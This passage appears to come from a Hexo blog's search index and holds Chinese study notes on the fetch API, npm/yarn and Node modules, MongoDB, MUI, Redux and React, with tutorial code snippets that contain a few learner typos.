        <tag>axios</tag>
        <tag>请求合并以及参数配置</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[axios学习笔记一]]></title>
    <url>%2F2018%2F09%2F15%2Faxios%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%89%2F</url>
    <content type="text"><![CDATA[fetchfetch:不是ajax，它诞生的目的是为了ajax,它是JS 中内置的API;基于fetch可以实现客户端和服务器端的信息通信 1、fetch是2018规范中新增的API,所以浏览器的支持度不是很好(可以基于babel的最新语法解析包把其进行解析),想要兼容性好一些,需要使用”fetch ployfill” 2、使用fetch发送请求 GET/POST等请求不能设置body 不管服务器返回的状态是多少,fetch都不认为是失败(哪怕是4或者5开头的状态码),都执行的是then方法,(需要我们自己进行异常操作处理) 12345678910111213141516171819202122232425262728fetch('url',&#123; method:'get', body:'a=2&amp;b=3', headers:&#123; //=&gt;设置请求头 'content-type':'x-www-form-urlencoded' &#125; credentials:'include'//=&gt;不管同源还是跨域请求都带着cookie信息&#125;).then(result=&gt;&#123; console.log(result); /** headers:&#123;&#125;包含响应头信息 redirected:false 是否重定向 status:状态码 statusText:状态信息 type:'base/cors' 状态类型 url:''请求的地址 __proto__:Response arrayBuffer() blob() json() text() ... 基于这些方法可以快速的把从服务器中获取到的 */&#125;).catch(msg=&gt;&#123;&#125;) get请求 1234567891011fetch('').then(result=&gt;&#123; let &#123;status&#125; = result; if(/^(4|5)\d&#123;2&#125;$/.test(status))&#123; throw new Error('query data is error');手动抛出异常 return ; &#125;&#125;).then(result=&gt;&#123; console.log(result);&#125;).catch(msg=&gt;&#123; console.log(msg);&#125;) post请求 1234567891011121314fetch('',&#123; methof:'post', body:'a=1&amp;b=2'//=&gt;body只支持字符串&#125;).then(result=&gt;&#123; let &#123;status&#125; = result; if(/^(4|5)\d&#123;2&#125;$/.test(status))&#123; throw new Error('query data is error');手动抛出异常 return ; &#125;&#125;).then(result=&gt;&#123; console.log(result);&#125;).catch(msg=&gt;&#123; console.log(msg);&#125;)]]></content>
      <categories>
        <category>axios</category>
      </categories>
      <tags>
        <tag>axios</tag>
        <tag>fetch中的基础语法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[node笔记二]]></title>
    <url>%2F2018%2F09%2F11%2Fnode%E7%AC%94%E8%AE%B0%E4%BA%8C%2F</url>
    <content type="text"><![CDATA[1.在本地项目中基于NPM/YARN安装第三方模块第一步：在本地项目中创建一个“package.json”的文件作用：把当前项目所有依赖的第三方模块信息（包含：模块名称以及版本号等信息）都记录下来；可以在这里配置一些可执行的命令脚本等； 基于YARN会默认生成一个“配置清单”，只是信息没有手动创建的全面 npm init -y 或者 yarn init -y 创建配置清单的时候，项目目录中不应该出现中文和特殊符号，这样有可能识别不了 第二步：安装开发依赖：只有在项目开发阶段依赖的第三方模块生产依赖：项目部署实施的时候，也需要依赖的第三方模块 [npm] npm install xxx –save 保存到配置清单的生产依赖中 –save-dev 保存到开发依赖中 [yarn] yarn add xxx 默认就是保存到生产依赖中 –dev / -D 保存到开发依赖中 第三步：部署的时候“跑环境”不要自己一个个的安装，只需要执行 npm install 或者 yarn install 即可，npm会自己先检测目录中是否有package.json文件，如果有的话，会按照文件中的配置清单依次安装 =&gt;开发一个项目，我们生成一个配置清单“package.json”，当我们安装第三方模块使用的时候，把安装的模块信息记录到配置清单中，这样以后不管是团队协作开发还是项目部署上线，我们都没有必要把node_modules发文件发送给别人，只需要把配置清单传递给其它人即可，其他人拿到配置清单后，按照清单中依赖项及版本号，重新安装即可（重新安装：“跑环境”） package.json 123456789101112131415161718&#123; "name": "0609DAY1", //=&gt;模块名称 "version": "1.0.0", //=&gt;版本号 "description": "", //=&gt;模块的描述 "main": "index.js", //=&gt;当前模块的主入口文件 "dependencies": &#123; //=&gt;生产依赖 "zepto": "^1.2.0" &#125;, "devDependencies": &#123; //=&gt;开发依赖 &#125;, "scripts": &#123; //=&gt;可执行脚本 "test": "echo \"Error: no test specified\" &amp;&amp; exit 1" &#125;, "keywords": [], "author": "", "license": "ISC"&#125; 2.安装在本地和全局的区别[安装在全局的特点] 1.所有的项目都可以使用这个模块 -&gt;容易导致版本冲突-&gt;安装在全局的模块，不能基于CommonJS模块规范调取使用（也就是不能在JS中通过REQUIRE调取使用） [安装在本地的特点] 1.只能当前项目使用这个模块 -&gt;不能直接的使用命令操作（安装在全局可以使用命令） 为啥安装在全局下可以使用命令? npm root / -g 查看本地项目或者全局环境下,NPM的安装目录 安装在全局目录下的模块，但部分都会生成一个xxx.cmd的文件，只要有这个文件，那么xxx就是一个可执行的命令（例如：yarn.cmd =&gt; yarn就是命令） 123456789101112131415161718192021@IF EXIST "%~dp0\node.exe" ( "%~dp0\node.exe" "%~dp0\node_modules\yarn\bin\yarn.js" %* ) ELSE ( @SETLOCAL @SET PATHEXT=%PATHEXT:;.JS;=;% node "%~dp0\node_modules\yarn\bin\yarn.js" %* )``` 能否即安装在本地，也可以使用命令操作？可以，但是需要配置package.json中的scripts- 1.把模块安装在本地，如果是支持命令操作的（会在node_modules的bin中生成xxx.cmd的命令文件，只不过这个文件无法在全局下执行 =&gt;不能直接用命令）- 2.在package.json的scripts中配置需要执行的命令脚本 ```javascript "scripts": &#123; "zxt": "lessc -v" 属性名自己设置即可，属性值是需要执行的命令脚本，根据需要自己编写(可以配置很多命令的)&#125; 3.npm run zxt / yarn zxt 这样的操作就是把配置的脚本执行 -&gt;首先到配置清单的scripts中查找-&gt;找到把后面对应的属性值（执行脚本）执行-&gt;执行脚本的时候，会到本地node_modules中的bin文件加查找，没有的话，在向NPM安装的全局目录下查找 3.NODE入门NODE本身是基于CommonJS模块规范设计的，所以模块是NODE的组成 内置模块：NODE天生提供给JS调取使用的 第三方模块：别人写好的，我们可以基于NPM安装使用 自定义模块：自己创建一些模块 CommonJS模块化设计的思想（AMD/CMD/ES6 MODULE都是模块设计思想） 1.CommonJS规定，每一个JS都是一个单独的模块（模块是私有的：里面涉及的值和变量以及函数等都是私有的，和其它JS文件中的内容是不冲突的） 2.CommonJS中可以允许模块中的方法互相的调用 B模块中想要调取A模块中的方法=&gt;A导出=&gt;B导入 [导出] CommonJS给每一个模块（每个JS）中都设置了内置的变量/属性/方法module：代表当前这个模块[object]module.exports：模块的这个“属性”是用来导出当前模块的属性和方法的 [object]exports：是内置的一个“变量”，也是用来导出当前模块属性方法的，虽然和module.exports不就是一个东西，但是对应的值是同一个(module.exports=exports 值都是对象) [导入] require：CommonJS提供的内置变量，用来导入模块的（其实导入的就是module.exports暴露出来的东西）；导入的值也是[object]类型的； CommonJS特点： 所有代码都运行在模块作用域，不会污染全局作用域（每一个模块都是私有的，包括里面所有的东西也都是私有的，不会和其它模块产生干扰） 模块可以多次加载，但是只会在第一次加载时运行一次，然后运行结果就被缓存了，以后再加载，就直接读取缓存结果。要想让模块再次运行，必须清除缓存。（为了保证性能，减少模块代码重复执行的次数） 模块加载的顺序，按照其在代码中出现的顺序。CommonJS规范加载模块是同步的，也就是说，只有加载完成，才能执行后面的操作。 案例：A/B/C三个模块 A中有一个sum方法：实现任意数求和 B中有一个avg方法：实现任意数求平均（先求和再求平均：B中用到A） C中调取B中的avg，实现 12,23,34,45,56,67,78,89 求平均数 1234require导入规则 require('./xxx') 或者 ../xxx 再或者 /xxx，这种自己制定路径的模式，都是为了导入自定义的模块，换句话说，想要导入自定义的模块，必须加路径 require('xxx') 首先到当前项目的node_modules中查找是否存在这个模块，不存在找node提供的内置模块（导入第三方或者内置的） __dirname：模块中这个内置变量是当前模块所在的绝对路径（具体到盘符：物理路径 例如：E:\201802LESSON\WEEK9\0609DAY1； 相对路径：WEEK9\0609DAY1 相对于根目录的路径；） filename：相对于dirname来讲，多了模块名称，例如：E:\201802LESSON\WEEK9\0609DAY1\C.js 4.NODE中的内置模块 http://nodejs.cn/api/ 【fs内置模块：实现I/O操作】 12345678910111213141516171819let fs = require('fs');1. fs.mkdir / fs.mkdirSync：创建文件夹，有Sync的是同步创建，反之没有是异步，想要实现无阻塞的I/O操作，我们一般都是用异步操作完成要处理的事情2. fs.readdir / fs.readdirSync：读取文件目录中的内容3. fs.rmdir ：删除文件夹4. fs.readFile：读取文件中的内容5. fs.writeFile：向文件中写入内容（覆盖写入：写入的新内容会替换原有的内容）6. fs.appendFile：追加写入新内容，原有的内容还在7. fs.copyFile：拷贝文件到新的位置8. fs.unlink：删除文件...]]></content>
      <categories>
        <category>node</category>
      </categories>
      <tags>
        <tag>node基础二</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[node笔记]]></title>
    <url>%2F2018%2F09%2F11%2Fnode%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[1.什么是NODE？ 基于V8引擎（谷歌浏览器的引擎）渲染JS的工具或者环境 -&gt;安装NODE -&gt;把JS代码放到NODE环境中执行 2.安装NODE https://nodejs.org/en/ node安装完成后 -&gt;当前电脑上自动安装了npm(Node Package Manager)：一个JS模块（所有封装好可以供其它人调取使用的都可以称之为模块或者包）管理的工具，基于npm可以安装下载JS模块 -&gt;它会生成一个node执行的命令（可以在DOS窗口或者终端命令中执行）：node xxx.js 如果不成功，可以找相同电脑配置的人员，把安装成功的NODE文件夹拷贝到自己的电脑上，通过配置环境变量，来实现NODE安装 3.如何在NODE中渲染和解析JS -&gt;REPL模式 (Read-Evaluate-Print-Loop，输入-求值-输出-循环) -&gt;直接基于NODE来执行JS文件 1）在命令窗口中执行（DOS窗口 &amp; 终端窗口） 2）WB中的Terminal中也可以执行node命令 3）直接在WB中执行（右键=&gt;RUN xxx.js），这种方式可能会产生缓存（尤其是文件的目录改动后） 4.之所以把NODE作为后台编程语言，是因为： 1）我们可以把NODE安装在服务器上 2）我们可以把编写的JS代码放到服务器上，通过NODE来执行它（我们可以使用JS来操作服务器，换句话说，使用JS来实现服务器端的一些功能操作 =&gt;其实说NODE是后台语言，想要表达的是JS是后台语言 “JS是一门全栈编程语言”） 5.NODE做后台的优势和特点 传统后台语言：JAVA/Python/PHP/C#(.NET)… =&gt;单线程的 =&gt;基于V8引擎渲染：快 =&gt;异步无阻塞的I/O操作：I/O (INPUT/OUTPUT) 对文件的读写 =&gt;event-driven事件驱动：类似于发布订阅或者回调函数 6.在WB中开启NODE内置方法的代码提示 File -&gt; settings -&gt; languages &amp; frameworks -&gt; node.js and npm -&gt; 开起代码提示只要点击“Enable”按钮即可（Disable是取消代码提示） ============================NPM的应用 目前“工程化/自动化”开发（不一定是写后台），都是基于NODE环境，基于NPM管理模块，基于WEBPACK实现模块之间的依赖打包，部署上线等 NPM常规操作 12345npm install xxx 把模块安装到当前目录（在哪个目录下执行的命令，这个目录就是当前目录）下npm install xxx -g 把模块安装在全局目录下npm uninstall xxx / npm uninstall xxx -g 卸载模块npm install xxx@xxx 安装指定版本号的模块npm view xxx &gt; xxx.version.txt 查看模块的历史版本信息 NPM的默认安装源都是在 https://www.npmjs.com/ 网站中查找的，在国内安装，下载速度较慢，想要下载速度快一些，我们可以如下处理： 1.使用淘宝镜像-&gt;安装cnpm，后期都是基于cnpm安装管理 12npm install cnpm -gcnpm install zepto -&gt;安装nrm切源工具，基于nrm把源切换到淘宝源上 1234npm install nrm -gnrm ls 查看当前可用的源nrm use xxx 使用某个源这样处理完成后，后期模块的管理依然基于npm即可 2.基于YARN安装：它也是模块管理器，类似于NPM，但是安装管理的速度比NPM快很多 123456npm install yarn -gyarn add xxxyarn remove xxx使用yarn只能把模块安装到当前目录下，不能安装到全局环境下 3.bower也是类似于npm的包管理器，只不过它是从gitHub下载安装 1234npm install bower -gbower install xxx...]]></content>
      <categories>
        <category>node</category>
      </categories>
      <tags>
        <tag>node基础笔记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mongodb学习笔记(一)]]></title>
    <url>%2F2018%2F09%2F09%2Fmongodb%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%B8%80)%2F</url>
    <content type="text"><![CDATA[什么是MongoDB？ MongoDB是一个基于分布式文件存储的开源数据库系统 MongoDB 将数据存储为一个文档，数据结构由键值(key=&gt;value)对组成。MongoDB 文档类似于 JSON 对象。字段值可以包含其他文档，数组及文档数组。 MongoDB的基本概念]]></content>
      <categories>
        <category>mongodb</category>
      </categories>
      <tags>
        <tag>monodb数据库</tag>
        <tag>学习笔记(一)</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MUI学习笔记(一)]]></title>
    <url>%2F2018%2F09%2F09%2FMUI%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%B8%80)%2F</url>
    <content type="text"><![CDATA[MUI的定位最接近原生体验的移动App的IUI框架 基于MUI的定位,产生了MUI的几个特点,轻、小、只涉及UI、只为移动App而生,界面风格原生化；因此MUI有所为有所不为。]]></content>
      <categories>
        <category>MUI</category>
      </categories>
      <tags>
        <tag>MUI</tag>
        <tag>MUI学习笔记(一)</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[react学习笔记(w二十)]]></title>
    <url>%2F2018%2F09%2F08%2Freact%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%BA%8C%E5%8D%81)%2F</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[react学习笔记(十九)]]></title>
    <url>%2F2018%2F09%2F08%2Freact%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E5%8D%81%E4%B9%9D)%2F</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[react学习笔记(十八)]]></title>
    <url>%2F2018%2F09%2F08%2Freact%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E5%8D%81%E5%85%AB)%2F</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[react学习笔记(十七)]]></title>
    <url>%2F2018%2F09%2F08%2Freact%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E5%8D%81%E4%B8%83)%2F</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[react学习笔记(十六)]]></title>
    <url>%2F2018%2F09%2F08%2Freact%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E5%8D%81%E5%85%AD)%2F</url>
    <content type="text"><![CDATA[redux工程化目录 [文件目录] store: reducer:存放每一个模块的reducer vote.js personal.js … index.js:把每一个模块的reducer最后合并成为一个reducer action:存放每一个模块需要进行的派发任务(ActionCreator) vote.js: personal.js … index.js:所有模块的Action进行合并 action-types.js所有派发任务的行为标识都在这里进行宏观管理 index.js:创建store action-types.js12345678910111213/** * 管控当前项目中所有redux任务派发中需要的行为标识ACTION-TYPE * *///=&gt;VOTE export const VOTE_SUPPORT = 'VOTE_SUPPORT';export const VOTE_AGAINST = 'VOTE_AGAINST';//=&gt;PERSONALexport const PERSONAL_INIT = 'PERSONAL_INIT'; reducer/personal.js123456import * as TYPE from "../action-types";export default function personal(state = &#123; baseInfo:&#123;&#125;&#125;,action) &#123; return state;&#125; ###]]></content>
      <categories>
        <category>redux</category>
      </categories>
      <tags>
        <tag>redux</tag>
        <tag>redux的工程化结构</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[react学习笔记(十五)]]></title>
    <url>%2F2018%2F09%2F08%2Freact%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E5%8D%81%E4%BA%94)%2F</url>
    <content type="text"><![CDATA[REDUXREDUX：组件实现信息共享交互的解决方案(本身是一个插件-&gt;思想),应用到任何项目当中(包含Vue项目)REACT-REDUCT/DVA/MOBX: 为react项目提供研发的(除了MOBX其余的都是基于REDUX完成的)VUEX：为VUE项目研发的 前提：一般在SPA单页面应用中,我们才会基于REDUX管理,因为MPA多页面应用,在页面跳转的时候,之前的作用域会释放,存储的信息(包含REDUX信息会销毁=&gt;REDUX不是本地存储,页面刷新或者关闭,存储的信息就会消失) createStore:创建REDUX容器createStore创建REDUX容器(存储公共状态信息) REDUX流程 1、创建一个REDUX容器(附带了一个事件池)：createStore 12345store:&#123; dispatch:派发任务给reducer subscribe:向事件池中追加方法 get-state:获取REDUX事件池中的状态信息 &#125; 2、执行createStore必须指定一个管理员reducer(reducer是一个函数),在reducer中完成状态信息的更新和管理 123456789101112//=&gt;开始创建容器的时候,容器中没有状态信息,那么第一次执行reducer(只有dispatch才会通知reducer才会执行)，此时state是没有信息的,为了防止报错，我们给其一贯初始状态信息值即可 function reducer(state = &#123; n: 0, m: 0 &#125;, action) &#123;//=&gt;reducer默认会有一个state参数：存储的是当前redux容器中的状态信息//=&gt;第二个参数action:action是派发任务(dispatch)传递的行为对象:store.dispatch(&#123;type:'xxx'&#125;)type行为标识是action中必须具有的属性,这个是语法规范,只有这样reducer才能根据不同标识做不同的事情state = JSON.parse(JSON.stringify(state));//=&gt;进来后先进行原始状态的深度拷贝,防止state的操作直接修改原始状态信息,我们需要最后return的时候才修改 return this.state;//=&gt;返回的是什么,相当于把原有的状态信息修改成为什么&#125;let store = createStore(reducer); Vote.js文件 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263import React from "react";import PropTypes from "prop-types";import VoteBody from "./VoteBody";import VoteFooter from "./VoteFooter";import VoteHeader from "./VoteHeader";import &#123; createStore &#125; from "redux";let store = createStore(function reducer(state = &#123; n:0, m:0&#125;, action) &#123; state = JSON.parse(JSON.stringify(state)); if (action.type === 'A') &#123; state.n++; &#125; if(action.type === 'B')&#123; state.m++; &#125; return state;&#125;)store.dispatch(&#123; type: 'A'&#125;)export default class Vote extends React.Component &#123; static defaultProps = &#123; title: '珠峰培训教学很棒~' &#125;; static proptypes = &#123; title: PropTypes.string &#125; // =&gt;把store放到上下文当中,这样后期哪一个后代组件需要使用store直接基于上下文获取到即可(属性传递也可以,但是操作比较麻烦) static childContextTypes = &#123; store:PropTypes.object &#125; getChildContext() &#123; return &#123; store &#125; &#125; constructor(props, context) &#123; super(props, context); &#125; render() &#123; let &#123; n, m &#125; = this.state, rate = n + m === 0 ? '100%' : (n / (n + m) * 100).toFixed(2) + '%'; let styleOBJ = &#123; width: '50%', margin: '5% auto' &#125; return (&lt;section className="panel panel-default" style=&#123;styleOBJ&#125;&gt; &#123;/* 父组件Vote把接收到的标题基于title属性传递给子组件header */&#125; &lt;VoteHeader /&gt; &lt;VoteBody /&gt; &#123;/* 把父组件的某一个方法当做属性传递给子组件 */&#125; &lt;VoteFooter /&gt; &lt;/section&gt;) &#125; change = flag =&gt; &#123; flag ? this.n++ : this.m++; this.forceUpdate();//强制更新 &#125;&#125; VoteHeader.js 1234567891011121314151617import React from "react";import PropTypes from "prop-types";export default class VoteHeader extends React.Component&#123; // 需要用到哪一个上下文信息，就指定哪一个类型即可(类型和之前设定的类型一致才可以,它也是在constructor之前执行) static contextTypes=&#123; store:PropTypes.object &#125; constructor(props, context)&#123; super(props,context); &#125; render()&#123; return (&lt;header className="panel-heading"&gt; &lt;h3&gt;&#123;this.context.tt&#125;&lt;/h3&gt; &lt;/header&gt;) &#125;&#125; VoteBody.js组件 12345678910111213141516171819202122232425262728import React from "react";import PropTypes from "prop-types";export default class VoteBody extends React.Component&#123; static contextTypes =&#123; store:PropTypes.object &#125; constructor(props,context)&#123; super(props,context) &#125; componentDidMount()&#123; //=&gt;第一次渲染完成之后，我们向REDUX事件池中追加一个方法(方法用来重新渲染当前组件),当redux状态改变,组件会重新渲染即可 //=&gt;subscribe:向事件池中追加方法,返回一个 函数,这个返回的函数执行就是把当前追加的方法从事件池移除 let unsubscribe = this.context.store.subscribe(()=&gt;&#123; this.forceUpdate();//=&gt;强制渲染当前组件,把更新组件的方法放事件池中 &#125;) unsubscribe();//=&gt;fn执行的时候就把事件池中的方法移除了 &#125; render()&#123; let &#123;store&#125; = this.context, &#123;n,m&#125; = store.getState(), rate = m+n===0?'100%':(n/(n+m)*100).toFixed(2)+'%'; return (&lt;main className="panel-body"&gt; 支持人数：&#123;n&#125; 人&lt;br /&gt; 反对人数：&#123;m&#125;人 &lt;br /&gt; 支持比率：&#123;rate&#125; &lt;br /&gt; &lt;/main&gt;) &#125;&#125; VoteFooter.js 123456789101112131415161718192021222324252627import React from "react";import PropTypes from "prop-types";export default class VoteFooter extends React.Component&#123; static contextProps = &#123; store:PropTypes.object &#125; constructor(props,context)&#123; super(props,context); &#125; // =&gt;this.props.handleClick:父组件传递过来的方法(方法是父组件的) render()&#123; // 通过事件委托实现：点击的时候把父组件的方法执行,并且根据点击按钮的不同,传递不同的信息过去 let change = this.context; return (&lt;footer className="panel-footer"&gt; &lt;button className="btn btn-success" onClick=&#123;()=&gt;&#123; store.dispatch(&#123; type:'A' &#125;) &#125;&#125;&gt;支持&lt;/button&gt;&amp;ensp;&amp;ensp; &lt;button className="btn btn-danger" onClick=&#123;()=&gt;&#123; store.dispatch(&#123; type:'B' &#125;) &#125;&#125;&gt;反对&lt;/button&gt; &lt;/footer&gt;) &#125;&#125;]]></content>
      <categories>
        <category>react</category>
      </categories>
      <tags>
        <tag>react</tag>
        <tag>redux基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[react学习笔记(十三)]]></title>
    <url>%2F2018%2F09%2F07%2Freact%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E5%8D%81%E4%B8%89)%2F</url>
    <content type="text"><![CDATA[react基础知识复习：(一) 1、react是Facebook公司开发的一款MVC版的JS框架 MVC：model(数据层) view(视图层) controller(控制层) 核心思想：通过数据的改变来影响视图的渲染(数据驱动的思想) 2、基于脚手架create-react-app,快速构建一个react工程项目结构 自动安装react的核心组件：react/react-dom 自动安装webpack,并且完成相关的配置： =&gt;区分了开发环境和生产环境=&gt;安装babel以及对应的语言解析包,可以把react和ES6进行编译处理=&gt;安装css/style/file等加载器,处理css等合并压缩的问题=&gt;安装了ES-Lint,可以进行代码检查=&gt;安装了很多的插件，可以实现了JS和CSS以及HTML的分离,打包、压缩等=&gt;安装了webpack-dev-server,可以在开发环境下,编译后自动创建服务,打开浏览器,当代码修改后，自动保存编译,页面自动刷新渲染等 [使用脚手架]123456&lt;!-- 把脚手架安装到全局环境下，以后应用命令操作，完成项目结构的搭建 --&gt;npm install create-react-app&lt;!-- 创建项目结构目录 --&gt;create-react-app +项目名(遵循npm发包规范：名字只能是/^[a-z0-9_-]$/)特点是：如果当前电脑安装了yarn ,创建工程目录的时候，走的是yarn 安装,yarn和npm主体相同,但是处理起来还有一定的区别,所以我们以后继续向工程中安装模块以及执行配置脚手架打包编译的时候，尽可能使用yarn ,不建议和npm混用 [工程化目录] |-node_modules |-.bin所有在本地可执行的命令脚本(react-script.cmd) |…|-package.json当前项目的配置清单|-public 存放的是当前项目的HTML页面(有可能放一部分静态资源) |-index.html |… |-src存放的项目需要的所有的js或者静态资源(包括组件、store、路由、数据模型、ajax请求等等内容,我们开发的内容基本上所有的东西都在src中写) |-index.js当前项目的入口文件 |… [暴露webpack配置项] 脚手架构建项目的时候，为了解构的美化,把所有的webpack配置等都隐藏到了node_modules中(react-scripts中),真实项目中,我们经常基于脚手架构建的解构自己在安装配置一些信息(例如：less处理的配置),此时我们需要把配置项暴露出来， 123456789101112131415yarn eject //此项是不可以逆转的(而且操作之前需要把所有修改的文件提交大Git仓库中)//目录中多了//|-config //|-webpack.config.dev.js:开发环境下的wp配置 //|-webpack.config.prod.js:生产环境下的wp配置 //|-path.js基本配置项(包含项目的入口信息)//|-scripts //|-start.js/build.js.test.js当我们执行yarn start/build/test的时候，执行的就是这三个JS中的一个``` [可执行的本地脚本命令]```javascriptyarn start //开发依赖 =&gt;创建一个端口号为3000,协议为http的web服务=&gt;打开浏览器,预览我们正在开发的项目=&gt;当项目文件修改的时候，自动重新编译,浏览页面自动刷新,展示最新的效果 [mac/linux] 12HTTPS=true yarn startPORT=1234 yarn start 1yarn build =&gt;生成一个build文件夹,存放最后打包的文件=&gt;基于webpack.config.prod.js,把项目进行编译打包=&gt;部署上线的时候,只需要把build中的内容发布即可 [基于脚手架配置less] 安装less和对应的加载器 1yarn add less less-loader 修改开发和生产环境下的webpack配置 react基础知识复习(二)： 1、react是基于独有的JSX语法实现视图(数据和HTML)渲染的 2、JSX语法 A、JSX语法的渲染使用的是ReactDOM.render 1ReactDOM.render([JSX元素],[指定的容器],[回调函数：当我们把JSX放到指定容器内,触发执行的函数]) B、JSX=JAVASCRIPT+XML(HTML) 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556 1、不推荐存放的容器是body(写body会报错),一般都是使用我们自己创建的一个根元素(例如：创建#root的div容器) ReactDOM.render(&lt;h3&gt;小柯&lt;/h3&gt;,root) 2、不允许出现两个 `根`元素,如果需要绑定复杂的解构,最外层嵌套一个容器作为根元素即可 ReactDOM.render(&lt;div&gt;&lt;h3&gt;小柯&lt;/h3&gt;&lt;span&gt;&lt;/span&gt;&lt;/div&gt;,root) 3、把数据渲染到JSX中 (不是嵌入到元素的属性中,而是正常的内容中) =&gt;可以嵌入变量或者直接的数据值 let name="xxx"; ReactDOM.render(&lt;div&gt;&lt;h3&gt;&#123;name&#125;&lt;/h3&gt;&lt;span&gt;&#123;'hahah'&#125;&lt;/span&gt;&lt;/div&gt;,root) =&gt;不能嵌入对象(代指：&#123;&#125;、/^$/、日期对象、函数、或者数组中的某一项是前面的也不行[一维简单的数据是可以的]) =&gt;可以嵌入基本类性质(null、undefined、布尔值都是空元素,也就是不显示任何内容) =&gt;大括号中可以嵌入JSX表达式(执行JS代码需要有返回结果的) 循环创建的JSX元素需要设置标识key,并且在当前循环的时候,这个key需要唯一,使用map是因为他有返回值,返回的是替换后的数组 ReactDOM.render(&lt;ul&gt; &#123; data.map((item,index)=&gt;&#123; return &lt;li key=&#123;index&#125;&gt;&#123;item.id&#125;&lt;/li&gt; &#125;) &#125; &lt;/ul&gt;,root);使用三元运算符解决判断操作(if和switch都不可以)4、可以给JSX元素设置属性=&gt;属性值对应大括号中、对象、函数都可以放(也可以放JS表达式)=&gt;style属性值必须是对象(不能是字符串)=&gt;class用className来代替5、JSX语法：JSX元素/react元素/虚拟DOMreact是如何把JSX元素转换为真实的DOM元素并添加到页面中？=&gt;基于babel/babel-loader/babel-preset-react-app把JSX语法编译为react.createElemnt这种模式=&gt;1、create-element中至少两个参数,没有上限 =&gt;第一个：目前是当前元素标签的标签名(字符串) =&gt;第二个：属性(没有给元素设置属性则为null) =&gt;其他的：当前元素的所有子元素内容(只要子元素是HTML，就会变为新的create-element)=&gt;2、执行create-element,把传递进来的参数最后处理成为一个对象&#123; type:'标签名', props:&#123; 自己设置的哪些属性对象(但是对于key和ref来说是要提取出来的) children:存放自己子元素的(没有资源数就没有这个属性),如果有多个子元素,就可以以数组的形式存储信息 &#125;, ref:null, key:null&#125; =&gt;3、把生成的对象交给render进行处理：把对象编程DOM元素,插入到指定的容器中 react基础知识复习(三)真实项目中我们使用react都是基于组件或者模块开发的 调取组件的时候：babel解析,传递给create-element的第一个参数type不再是字符串标签名,而是一个函数(类),生成的对象中,type也是一个函数,当render渲染的时候会根据type类型做不同的事情(如果是字符串就是创建新元素,如果是函数,就会把函数执行,把返回的JSX对象创建成为新的元素进行渲染),函数执行的时候会把解析处理的对象中的props作为参数传递给组件(函数) 1、函数式创建组件 函数式组件声明：创建一个函数、里面返回一个JSX 函数式声明的特点： 1、会把基于create-elment解析出来的对象中的props作为参数传递给组件(可以完成多次调取组件传递不同的信息)2、一旦组件调取成功,返回的JSX就会渲染到页面上,但是后期不通过重新调取组件或者获取DOM元素操作的方式,很难再把渲染好的组件内容再更改=&gt;函数式组件声明时静态组件 123function Vote()&#123; return &lt;section&gt;&lt;/section&gt;...&#125; 2、基于类创建组件(基于继承component类实现的) 基于类创建组件的特点： 1、调取组件相当于创建类的实例(this),把一些私有的属性挂载到实例上了,这样组件内容所有方法中都可以基于实例获取这些值(包括：传递的属性和自己管理的状态)2、有自己的状态管理,当状态改变的时候,react会重新渲染视图(差异更新：基于DOM-DIFF只把需要重新渲染的部分渲染即可) =&gt; ref：是react中提供操作DOM的方案 1、给需要操作的元素设置ref(保持一致性,否则会冲突覆盖)2、在实例上挂载了refs属性 12345class A extends React.Component&#123; constructor()&#123; super();//=&gt;React.Component.call(this)可以把component中的私有属性继承过来this.props/this.state(this.setState)/this.context/this.ref/this.updater &#125;&#125; react基础知识复习(四)1234let n = 0;this.setState(&#123; m:n++&#125;); 1、生命周期函数 [调取组件] constructor componentWillMount第一次渲染之前 render渲染 componentDidMount第一次渲染之后 [组件重新渲染：内部状态改变、传递给组件的属性改变] 状态改变： shouldComponentUpdate =&gt;是否允许组件更新:返回true是允许,返回false则不再继续向下走 componentWillUpdate =&gt;更新之前:和should一样,方法中通过this.state.xxx获取的还是更新前的状态信息,方法中有两个参数：nextProps/nextState存储的是最新的属性和状态信息 render =&gt;更新 componentDidUpdate =&gt;更新之后 属性改变 componentWillReceiveProps(nextProps,nextState) =&gt;接收最新属性之前,基于this.props.xxx获取的还是原有的状态信息 shouldComponentUpdate =&gt;是否允许组件更新:返回true是允许,返回false则不再继续向下走 componentWillUpdate =&gt;更新之前:和should一样,方法中通过this.state.xxx获取的还是更新前的状态信息,方法中有两个参数：nextProps/nextState存储的是最新的属性和状态信息 render =&gt;更新 componentDidUpdate =&gt;更新之后 [组件销毁] componentWillUnmount =&gt;组件销毁之前 注意：组件的属性是只读的: 只能调取组件的时候传递进来，不能自己在组件内部修改(但是可以设置默认值和规则) 组件的状态是可读写的：状态改变会引发组件的重新更新(状态是基于setState改变) 组件实例上可以放一些信息：这些信息只是为了方便在组件内任意方法中获取和使用的 实例上挂在的refs：就是用来操作DOM的 实例上挂在的context：是用来实现组件之间信息传递的]]></content>
      <categories>
        <category>react</category>
      </categories>
      <tags>
        <tag>react学习笔记</tag>
